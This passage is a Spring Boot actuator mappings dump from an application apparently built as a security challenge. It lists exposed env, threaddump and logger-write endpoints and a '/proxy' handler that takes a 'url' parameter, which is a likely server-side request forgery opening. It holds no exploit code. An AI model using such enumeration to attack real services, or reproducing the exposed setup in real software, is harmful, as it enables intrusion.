                      "mediaType": "application/vnd.spring-boot.actuator.v2+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/json",
                      "negated": false
                    }
                  ]
                }
              }
            },
            {
              "predicate": "{GET [/actuator/loggers], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}",
              "handler": "Actuator web endpoint 'loggers'",
              "details": {
                "handlerMethod": {
                  "className": "org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler",
                  "name": "handle",
                  "descriptor": "(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"
                },
                "requestMappingConditions": {
                  "consumes": [],
                  "headers": [],
                  "methods": [
                    "GET"
                  ],
                  "params": [],
                  "patterns": [
                    "/actuator/loggers"
                  ],
                  "produces": [
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v3+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v2+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/json",
                      "negated": false
                    }
                  ]
                }
              }
            },
            {
              "predicate": "{GET [/actuator/health/**], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}",
              "handler": "Actuator web endpoint 'health-path'",
              "details": {
                "handlerMethod": {
                  "className": "org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler",
                  "name": "handle",
                  "descriptor": "(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"
                },
                "requestMappingConditions": {
                  "consumes": [],
                  "headers": [],
                  "methods": [
                    "GET"
                  ],
                  "params": [],
                  "patterns": [
                    "/actuator/health/**"
                  ],
                  "produces": [
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v3+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v2+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/json",
                      "negated": false
                    }
                  ]
                }
              }
            },
            {
              "predicate": "{GET [/actuator/metrics], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}",
              "handler": "Actuator web endpoint 'metrics'",
              "details": {
                "handlerMethod": {
                  "className": "org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler",
                  "name": "handle",
                  "descriptor": "(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"
                },
                "requestMappingConditions": {
                  "consumes": [],
                  "headers": [],
                  "methods": [
                    "GET"
                  ],
                  "params": [],
                  "patterns": [
                    "/actuator/metrics"
                  ],
                  "produces": [
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v3+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v2+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/json",
                      "negated": false
                    }
                  ]
                }
              }
            },
            {
              "predicate": "{GET [/actuator/threaddump], produces [text/plain;charset=UTF-8]}",
              "handler": "Actuator web endpoint 'threaddump'",
              "details": {
                "handlerMethod": {
                  "className": "org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler",
                  "name": "handle",
                  "descriptor": "(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"
                },
                "requestMappingConditions": {
                  "consumes": [],
                  "headers": [],
                  "methods": [
                    "GET"
                  ],
                  "params": [],
                  "patterns": [
                    "/actuator/threaddump"
                  ],
                  "produces": [
                    {
                      "mediaType": "text/plain;charset=UTF-8",
                      "negated": false
                    }
                  ]
                }
              }
            },
            {
              "predicate": "{GET [/actuator/info], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}",
              "handler": "Actuator web endpoint 'info'",
              "details": {
                "handlerMethod": {
                  "className": "org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler",
                  "name": "handle",
                  "descriptor": "(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"
                },
                "requestMappingConditions": {
                  "consumes": [],
                  "headers": [],
                  "methods": [
                    "GET"
                  ],
                  "params": [],
                  "patterns": [
                    "/actuator/info"
                  ],
                  "produces": [
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v3+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v2+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/json",
                      "negated": false
                    }
                  ]
                }
              }
            },
            {
              "predicate": "{GET [/actuator/caches/{cache}], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}",
              "handler": "Actuator web endpoint 'caches-cache'",
              "details": {
                "handlerMethod": {
                  "className": "org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler",
                  "name": "handle",
                  "descriptor": "(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"
                },
                "requestMappingConditions": {
                  "consumes": [],
                  "headers": [],
                  "methods": [
                    "GET"
                  ],
                  "params": [],
                  "patterns": [
                    "/actuator/caches/{cache}"
                  ],
                  "produces": [
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v3+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v2+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/json",
                      "negated": false
                    }
                  ]
                }
              }
            },
            {
              "predicate": "{POST [/actuator/loggers/{name}], consumes [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}",
              "handler": "Actuator web endpoint 'loggers-name'",
              "details": {
                "handlerMethod": {
                  "className": "org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler",
                  "name": "handle",
                  "descriptor": "(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"
                },
                "requestMappingConditions": {
                  "consumes": [
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v3+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v2+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/json",
                      "negated": false
                    }
                  ],
                  "headers": [],
                  "methods": [
                    "POST"
                  ],
                  "params": [],
                  "patterns": [
                    "/actuator/loggers/{name}"
                  ],
                  "produces": []
                }
              }
            },
            {
              "predicate": "{GET [/actuator/mappings], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}",
              "handler": "Actuator web endpoint 'mappings'",
              "details": {
                "handlerMethod": {
                  "className": "org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler",
                  "name": "handle",
                  "descriptor": "(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"
                },
                "requestMappingConditions": {
                  "consumes": [],
                  "headers": [],
                  "methods": [
                    "GET"
                  ],
                  "params": [],
                  "patterns": [
                    "/actuator/mappings"
                  ],
                  "produces": [
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v3+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v2+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/json",
                      "negated": false
                    }
                  ]
                }
              }
            },
            {
              "predicate": "{GET [/actuator/loggers/{name}], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}",
              "handler": "Actuator web endpoint 'loggers-name'",
              "details": {
                "handlerMethod": {
                  "className": "org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler",
                  "name": "handle",
                  "descriptor": "(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"
                },
                "requestMappingConditions": {
                  "consumes": [],
                  "headers": [],
                  "methods": [
                    "GET"
                  ],
                  "params": [],
                  "patterns": [
                    "/actuator/loggers/{name}"
                  ],
                  "produces": [
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v3+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v2+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/json",
                      "negated": false
                    }
                  ]
                }
              }
            },
            {
              "predicate": "{DELETE [/actuator/caches]}",
              "handler": "Actuator web endpoint 'caches'",
              "details": {
                "handlerMethod": {
                  "className": "org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler",
                  "name": "handle",
                  "descriptor": "(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"
                },
                "requestMappingConditions": {
                  "consumes": [],
                  "headers": [],
                  "methods": [
                    "DELETE"
                  ],
                  "params": [],
                  "patterns": [
                    "/actuator/caches"
                  ],
                  "produces": []
                }
              }
            },
            {
              "predicate": "{GET [/actuator/sbom], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}",
              "handler": "Actuator web endpoint 'sbom'",
              "details": {
                "handlerMethod": {
                  "className": "org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler",
                  "name": "handle",
                  "descriptor": "(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"
                },
                "requestMappingConditions": {
                  "consumes": [],
                  "headers": [],
                  "methods": [
                    "GET"
                  ],
                  "params": [],
                  "patterns": [
                    "/actuator/sbom"
                  ],
                  "produces": [
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v3+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v2+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/json",
                      "negated": false
                    }
                  ]
                }
              }
            },
            {
              "predicate": "{GET [/actuator/env], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}",
              "handler": "Actuator web endpoint 'env'",
              "details": {
                "handlerMethod": {
                  "className": "org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler",
                  "name": "handle",
                  "descriptor": "(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"
                },
                "requestMappingConditions": {
                  "consumes": [],
                  "headers": [],
                  "methods": [
                    "GET"
                  ],
                  "params": [],
                  "patterns": [
                    "/actuator/env"
                  ],
                  "produces": [
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v3+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v2+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/json",
                      "negated": false
                    }
                  ]
                }
              }
            },
            {
              "predicate": "{GET [/actuator/conditions], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}",
              "handler": "Actuator web endpoint 'conditions'",
              "details": {
                "handlerMethod": {
                  "className": "org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler",
                  "name": "handle",
                  "descriptor": "(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"
                },
                "requestMappingConditions": {
                  "consumes": [],
                  "headers": [],
                  "methods": [
                    "GET"
                  ],
                  "params": [],
                  "patterns": [
                    "/actuator/conditions"
                  ],
                  "produces": [
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v3+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v2+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/json",
                      "negated": false
                    }
                  ]
                }
              }
            },
            {
              "predicate": "{GET [/actuator/health], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}",
              "handler": "Actuator web endpoint 'health'",
              "details": {
                "handlerMethod": {
                  "className": "org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler",
                  "name": "handle",
                  "descriptor": "(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"
                },
                "requestMappingConditions": {
                  "consumes": [],
                  "headers": [],
                  "methods": [
                    "GET"
                  ],
                  "params": [],
                  "patterns": [
                    "/actuator/health"
                  ],
                  "produces": [
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v3+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/vnd.spring-boot.actuator.v2+json",
                      "negated": false
                    },
                    {
                      "mediaType": "application/json",
                      "negated": false
                    }
                  ]
                }
              }
            },
            {
              "predicate": "{ [/error], produces [text/html]}",
              "handler": "org.springframework.boot.autoconfigure.web.servlet.error.BasicErrorController#errorHtml(HttpServletRequest, HttpServletResponse)",
              "details": {
                "handlerMethod": {
                  "className": "org.springframework.boot.autoconfigure.web.servlet.error.BasicErrorController",
                  "name": "errorHtml",
                  "descriptor": "(Ljakarta/servlet/http/HttpServletRequest;Ljakarta/servlet/http/HttpServletResponse;)Lorg/springframework/web/servlet/ModelAndView;"
                },
                "requestMappingConditions": {
                  "consumes": [],
                  "headers": [],
                  "methods": [],
                  "params": [],
                  "patterns": [
                    "/error"
                  ],
                  "produces": [
                    {
                      "mediaType": "text/html",
                      "negated": false
                    }
                  ]
                }
              }
            },
            {
              "predicate": "{ [/proxy], params [url]}",
              "handler": "challenge.Application#proxy(String)",
              "details": {
                "handlerMethod": {
                  "className": "challenge.Application",
                  "name": "proxy",
                  "descriptor": "(Ljava/lang/String;)Ljava/lang/String;"
                },
                "requestMappingConditions": {
                  "consumes": [],
                  "headers": [],
                  "methods": [],
                  "params": [
                    {
                      "name": "url",
                      "negated": false
                    }
                  ],
                  "patterns": [
                    "/proxy"
                  ],
                  "produces": []
                }
              }
            },
            {
              "predicate": "{ [/]}",
              "handler": "challenge.Application#home()",
              "details": {
                "handlerMethod": {
                  "className": "challenge.Application",
                  "name": "home",
                  "descriptor": "()Ljava/lang/String;"
                },
                "requestMappingConditions": {
                  "consumes": [],
                  "headers": [],
                  "methods": [],
                  "params": [],
                  "patterns": [
                    "/"
                  ],
                  "produces": []
                }
              }
            },
            {
              "predicate": "{ [/error]}",
              "handler": "org.springframework.boot.autoconfigure.web.servlet.error.BasicErrorController#error(HttpServletRequest)",
              "details": {
                "handlerMethod": {
                  "className": "org.springframework.boot.autoconfigure.web.servlet.error.BasicErrorController",
                  "name": "error",
                  "descriptor": "(Ljakarta/servlet/http/HttpServletRequest;)Lorg/springframework/http/ResponseEntity;"
                },
                "requestMappingConditions": {
                  "consumes": [],
                  "headers": [],
                  "methods": [],
                  "params": [],
                  "patterns": [
                    "/error"
                  ],
                  "produces": []
                }
              }
            },
            {
              "predicate": "/webjars/**",
              "handler": "ResourceHttpRequestHandler [classpath [META-INF/resources/webjars/]]"
            },
            {
              "predicate": "/**",
              "handler": "ResourceHttpRequestHandler [classpath [META-INF/resources/], classpath [resources/], classpath [static/], classpath [public/], ServletContext [/]]"
            }
          ]
        },
        "servletFilters": [
          {
            "servletNameMappings": [],
            "urlPatternMappings": [
              "/*"
            ],
            "name": "requestContextFilter",
            "className": "org.springframework.boot.web.servlet.filter.OrderedRequestContextFilter"
          },
          {
            "servletNameMappings": [],
            "urlPatternMappings": [
              "/*"
            ],
            "name": "webMvcObservationFilter",
            "className": "org.springframework.web.filter.ServerHttpObservationFilter"
          },
          {
            "servletNameMappings": [],
            "urlPatternMappings": [
              "/*"
            ],
            "name": "Tomcat WebSocket (JSR356) Filter",
            "className": "org.apache.tomcat.websocket.server.WsFilter"
          },
          {
            "servletNameMappings": [],
            "urlPatternMappings": [
              "/*"
            ],
            "name": "characterEncodingFilter",
            "className": "org.springframework.boot.web.servlet.filter.OrderedCharacterEncodingFilter"
          },
          {
            "servletNameMappings": [],
            "urlPatternMappings": [
              "/*"
            ],
            "name": "formContentFilter",
            "className": "org.springframework.boot.web.servlet.filter.OrderedFormContentFilter"
          }
        ],
        "servlets": [
          {
            "mappings": [
              "/"
            ],
            "name": "dispatcherServlet",
            "className": "org.springframework.web.servlet.DispatcherServlet"
          }
        ]
      }
    }
  }
}
```
